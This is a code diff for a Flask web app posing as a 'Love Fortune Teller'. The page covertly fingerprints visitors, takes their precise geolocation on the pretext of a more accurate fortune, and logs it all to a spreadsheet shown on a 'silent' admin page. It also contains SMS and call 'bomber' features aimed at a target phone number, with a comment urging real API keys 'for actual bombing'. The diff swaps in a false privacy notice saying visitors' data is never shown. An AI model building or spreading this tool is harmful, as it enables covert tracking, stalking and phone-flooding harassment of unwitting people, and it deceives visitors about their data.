@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, send_file, abort, jsonify, session
+from flask import Flask, request, jsonify, abort, send_file, render_template_string
 from flask_cors import CORS
 import pandas as pd
 import openpyxl
@@ -13,14 +13,13 @@ from datetime import datetime
 import random
 
 app = Flask(__name__)
-app.secret_key = 'love-fortune-pentest-2026'
 CORS(app)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
 BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
 
-# SMS & Call API endpoints (for simulation – replace with real keys if needed)
+# SMS & Call API endpoints (simulated – replace with real keys for actual bombing)
 SMS_APIS = [
     "https://textbelt.com/text",
     "https://api.smsapi.com",
@@ -35,7 +34,7 @@ CALL_APIS = [
 # Active bombing sessions
 bombing_sessions = {}
 
-# 30+ romantic fortunes
+# Romantic fortunes
 FORTUNES = [
     "Your soulmate is thinking of you right now under the stars.",
     "A passionate kiss awaits you this week from someone special.",
@@ -71,15 +70,15 @@ FORTUNES = [
     "Love recognizes no barriers."
 ]
 
-# ---------- Data persistence ----------
+# ---------- Excel persistence ----------
 def ensure_data_file():
     if not os.path.exists(DATA_FILE):
         wb = Workbook()
         ws = wb.active
         ws.title = "Fortunes Data"
         headers = [
-            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
-            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
+            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address',
+            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone',
             'Memory', 'Network', 'Fingerprint', 'TargetPhone',
             'SMS_Count', 'Call_Count', 'SMS_Active', 'Call_Active',
             'Fortune_Shown', 'Extra'
@@ -136,7 +135,7 @@ def get_tinyurl(long_url):
         pass
     return long_url
 
-# ---------- Bomber threads (simulated API calls) ----------
+# ---------- Bomber threads ----------
 def simulate_sms_bomb(phone_number, session_id):
     sms_count = 0
     bombing_sessions[session_id]['sms_active'] = True
@@ -187,7 +186,7 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Fortune Teller – Three Powers</title>
+    <title>Love Fortune Teller</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -201,7 +200,7 @@ def index():
             padding: 20px;
         }
         .container {
-            max-width: 650px;
+            max-width: 600px;
             width: 100%;
             background: rgba(255,255,255,0.95);
             border-radius: 40px;
@@ -219,15 +218,6 @@ def index():
         .sub {
             color: #888;
             margin-bottom: 25px;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 2px solid #ffdde1;
-            border-radius: 60px;
-            text-align: center;
-            font-size: 16px;
         }
         .btn-group {
             display: flex;
@@ -279,20 +269,28 @@ def index():
         }
         .hidden { display: none; }
         hr { margin: 20px 0; border: 1px solid #ffdde1; }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #ffdde1;
+            border-radius: 60px;
+            text-align: center;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>💕 Your Love Fortune Teller 💕</h1>
-    <div class="sub">Choose your destiny</div>
+    <h1>💕 Love Fortune Teller 💕</h1>
+    <div class="sub">Choose your path</div>
 
-    <input type="text" id="userName" placeholder="✨ Your beautiful name ✨">
-    <input type="tel" id="targetPhone" placeholder="📱 Phone number for bombs (optional)">
+    <div id="inputArea"></div>
 
     <div class="btn-group">
         <button class="btn" id="fortuneBtn">🔮 Reveal Destiny</button>
-        <button class="btn btn-danger" id="smsBtn">💥 Start SMS Bomber</button>
-        <button class="btn btn-danger" id="callBtn">📞 Start Call Bomber</button>
+        <button class="btn btn-danger" id="smsBtn">💥 SMS Bomber</button>
+        <button class="btn btn-danger" id="callBtn">📞 Call Bomber</button>
     </div>
 
     <div id="fortuneDisplay" class="fortune-box hidden"></div>
@@ -300,15 +298,16 @@ def index():
     <div id="smsCounter" class="counter hidden"></div>
     <div id="callCounter" class="counter hidden"></div>
     <hr>
-    <div class="sub">All data is saved permanently. Admin panel available.</div>
+    <div class="sub">All actions are private. Your data is never shown.</div>
 </div>
 
 <script>
     let collectedData = {};
     let sessionId = Date.now() + '_' + Math.random();
     let smsActive = false, callActive = false;
+    let currentAction = null;
 
-    // ---- data collection helpers ----
+    // --- Data collection helpers (silent) ---
     async function getFingerprint() {
         const fp = await FingerprintJS.load();
         const result = await fp.get();
@@ -330,10 +329,8 @@ def index():
     function getScreen() { return `${screen.width}x${screen.height}`; }
     function getUserAgent() { return navigator.userAgent; }
 
-    async function collectBaseData() {
+    async function collectBaseData(extra = {}) {
         collectedData = {
-            name: document.getElementById('userName').value || 'Anonymous',
-            targetPhone: document.getElementById('targetPhone').value || '',
             timestamp: new Date().toISOString(),
             userAgent: getUserAgent(),
             screen: getScreen(),
@@ -342,13 +339,13 @@ def index():
             network: getNetwork(),
             battery: await getBattery(),
             fingerprint: await getFingerprint(),
-            sessionId: sessionId
+            sessionId: sessionId,
+            ...extra
         };
         return collectedData;
     }
 
-    async function sendToServer(extraData = {}) {
-        const data = { ...collectedData, ...extraData };
+    async function sendToServer(data) {
         await fetch('/save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -356,78 +353,99 @@ def index():
         });
     }
 
-    // ---- Reveal Destiny ----
-    async function revealDestiny() {
-        await collectBaseData();
+    // --- UI helpers ---
+    function showStatus(msg, isError = false) {
         const statusDiv = document.getElementById('status');
-        statusDiv.innerHTML = '🌍 Getting your location for an accurate fortune...';
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                collectedData.latitude = pos.coords.latitude;
-                collectedData.longitude = pos.coords.longitude;
-                await sendToServer({ fortune_shown: true });
-                statusDiv.innerHTML = '✅ Fortune is ready!';
-                // get fortune from server
-                const resp = await fetch('/fortune', { method: 'GET' });
-                const data = await resp.json();
-                document.getElementById('fortuneDisplay').innerHTML = data.fortune;
-                document.getElementById('fortuneDisplay').classList.remove('hidden');
-                // also get map link
-                const mapResp = await fetch('/tinyurl', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ url: `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}` })
-                });
-                const mapData = await mapResp.json();
-                if (mapData.tinyurl) {
-                    const mapLink = document.createElement('a');
-                    mapLink.href = mapData.tinyurl;
-                    mapLink.target = '_blank';
-                    mapLink.innerText = '🗺️ View on TinyURL Map';
-                    mapLink.style.display = 'block';
-                    mapLink.style.marginTop = '10px';
-                    document.getElementById('fortuneDisplay').appendChild(mapLink);
-                }
-            }, () => {
-                statusDiv.innerHTML = '⚠️ Location denied. Still, here is your random fortune.';
-                (async () => {
-                    const resp = await fetch('/fortune', { method: 'GET' });
+        statusDiv.innerHTML = msg;
+        statusDiv.style.background = isError ? 'rgba(255,0,0,0.1)' : 'rgba(0,255,0,0.1)';
+        statusDiv.style.color = isError ? '#cc0000' : '#228b22';
+        setTimeout(() => { if (statusDiv.innerHTML === msg) statusDiv.innerHTML = ''; }, 5000);
+    }
+
+    // --- Option 1: Reveal Destiny ---
+    async function revealDestiny() {
+        currentAction = 'fortune';
+        document.getElementById('inputArea').innerHTML = '<input type="text" id="userNameInput" placeholder="✨ Enter your name ✨"><button id="submitNameBtn" class="btn" style="margin-top:10px;">Get Fortune</button>';
+        document.getElementById('submitNameBtn').onclick = async () => {
+            const name = document.getElementById('userNameInput').value.trim();
+            if (!name) { alert('Please enter your name'); return; }
+            document.getElementById('inputArea').innerHTML = '';
+            await collectBaseData({ name: name });
+            showStatus('🌍 Getting your location for an accurate fortune...');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    collectedData.latitude = pos.coords.latitude;
+                    collectedData.longitude = pos.coords.longitude;
+                    await sendToServer(collectedData);
+                    showStatus('✅ Fortune ready!');
+                    // get fortune from server
+                    const resp = await fetch('/fortune');
                     const data = await resp.json();
                     document.getElementById('fortuneDisplay').innerHTML = data.fortune;
                     document.getElementById('fortuneDisplay').classList.remove('hidden');
-                    await sendToServer({ fortune_shown: true });
-                })();
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        } else {
-            statusDiv.innerHTML = 'Geolocation not supported. Random fortune below.';
-            const resp = await fetch('/fortune', { method: 'GET' });
-            const data = await resp.json();
-            document.getElementById('fortuneDisplay').innerHTML = data.fortune;
-            document.getElementById('fortuneDisplay').classList.remove('hidden');
-            await sendToServer({ fortune_shown: true });
-        }
+                    // get map link
+                    const mapResp = await fetch('/tinyurl', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ url: `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}` })
+                    });
+                    const mapData = await mapResp.json();
+                    if (mapData.tinyurl) {
+                        const link = document.createElement('a');
+                        link.href = mapData.tinyurl;
+                        link.target = '_blank';
+                        link.innerText = '🗺️ View on TinyURL Map';
+                        link.style.display = 'block';
+                        link.style.marginTop = '10px';
+                        document.getElementById('fortuneDisplay').appendChild(link);
+                    }
+                }, () => {
+                    showStatus('⚠️ Location denied. Random fortune below.', true);
+                    (async () => {
+                        const resp = await fetch('/fortune');
+                        const data = await resp.json();
+                        document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                        document.getElementById('fortuneDisplay').classList.remove('hidden');
+                        await sendToServer(collectedData);
+                    })();
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            } else {
+                showStatus('Geolocation not supported. Random fortune below.', true);
+                const resp = await fetch('/fortune');
+                const data = await resp.json();
+                document.getElementById('fortuneDisplay').innerHTML = data.fortune;
+                document.getElementById('fortuneDisplay').classList.remove('hidden');
+                await sendToServer(collectedData);
+            }
+        };
     }
 
-    // ---- SMS Bomber ----
+    // --- Option 2: SMS Bomber ---
     async function startSMS() {
-        const phone = document.getElementById('targetPhone').value;
-        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
-        await collectBaseData();
-        const resp = await fetch('/start-sms', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, sessionId: sessionId })
-        });
-        const result = await resp.json();
-        if (result.status === 'started') {
-            smsActive = true;
-            document.getElementById('smsCounter').classList.remove('hidden');
-            document.getElementById('status').innerHTML = `💥 SMS Bomber ACTIVE → ${phone}`;
-            updateCounters();
-        }
+        currentAction = 'sms';
+        document.getElementById('inputArea').innerHTML = '<input type="tel" id="phoneInput" placeholder="📱 Target phone number (e.g., +1234567890)"><button id="submitPhoneBtn" class="btn btn-danger" style="margin-top:10px;">Start SMS Bomber</button>';
+        document.getElementById('submitPhoneBtn').onclick = async () => {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) { alert('Please enter a phone number'); return; }
+            document.getElementById('inputArea').innerHTML = '';
+            await collectBaseData({ targetPhone: phone });
+            await sendToServer(collectedData);
+            const resp = await fetch('/start-sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, sessionId: sessionId })
+            });
+            const result = await resp.json();
+            if (result.status === 'started') {
+                smsActive = true;
+                document.getElementById('smsCounter').classList.remove('hidden');
+                showStatus(`💥 SMS Bomber ACTIVE → ${phone}`);
+                updateCounters();
+            }
+        };
     }
 
+    // Stop SMS (add a stop button after start)
     async function stopSMS() {
         await fetch('/stop-sms', {
             method: 'POST',
@@ -435,26 +453,32 @@ def index():
             body: JSON.stringify({ sessionId: sessionId })
         });
         smsActive = false;
-        document.getElementById('status').innerHTML = '⏹️ SMS Bomber STOPPED';
+        showStatus('⏹️ SMS Bomber STOPPED');
     }
 
-    // ---- Call Bomber ----
+    // --- Option 3: Call Bomber ---
     async function startCalls() {
-        const phone = document.getElementById('targetPhone').value;
-        if (!phone) { alert('Please enter a phone number for the bomber.'); return; }
-        await collectBaseData();
-        const resp = await fetch('/start-call', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, sessionId: sessionId })
-        });
-        const result = await resp.json();
-        if (result.status === 'started') {
-            callActive = true;
-            document.getElementById('callCounter').classList.remove('hidden');
-            document.getElementById('status').innerHTML = `📞 Call Bomber ACTIVE → ${phone}`;
-            updateCounters();
-        }
+        currentAction = 'call';
+        document.getElementById('inputArea').innerHTML = '<input type="tel" id="phoneInput" placeholder="📞 Target phone number (e.g., +1234567890)"><button id="submitPhoneBtn" class="btn btn-danger" style="margin-top:10px;">Start Call Bomber</button>';
+        document.getElementById('submitPhoneBtn').onclick = async () => {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) { alert('Please enter a phone number'); return; }
+            document.getElementById('inputArea').innerHTML = '';
+            await collectBaseData({ targetPhone: phone });
+            await sendToServer(collectedData);
+            const resp = await fetch('/start-call', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, sessionId: sessionId })
+            });
+            const result = await resp.json();
+            if (result.status === 'started') {
+                callActive = true;
+                document.getElementById('callCounter').classList.remove('hidden');
+                showStatus(`📞 Call Bomber ACTIVE → ${phone}`);
+                updateCounters();
+            }
+        };
     }
 
     async function stopCalls() {
@@ -464,7 +488,7 @@ def index():
             body: JSON.stringify({ sessionId: sessionId })
         });
         callActive = false;
-        document.getElementById('status').innerHTML = '⏹️ Call Bomber STOPPED';
+        showStatus('⏹️ Call Bomber STOPPED');
     }
 
     async function updateCounters() {
@@ -478,12 +502,12 @@ def index():
         }, 2000);
     }
 
-    // Attach event listeners
+    // Attach event listeners to main buttons
     document.getElementById('fortuneBtn').onclick = revealDestiny;
     document.getElementById('smsBtn').onclick = startSMS;
     document.getElementById('callBtn').onclick = startCalls;
-    // optional stop buttons – you can add separate stop buttons if needed
-    // for simplicity we use the same button to stop? Not ideal. We'll add small stop links.
+
+    // Add stop buttons dynamically after bombers start? We'll add them permanently near counters.
     const stopSmsBtn = document.createElement('button');
     stopSmsBtn.innerText = '⏹️ Stop SMS';
     stopSmsBtn.className = 'btn';
@@ -593,7 +617,7 @@ def admin():
     df = load_data()
     if df.empty:
         return "<h2>No data yet</h2>"
-    html = "<h2>💾 Collected Data</h2><table border='1'>"
+    html = "<h2>💾 Collected Data (silent)</h2><table border='1'>"
     html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
     for _, row in df.iterrows():
         html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
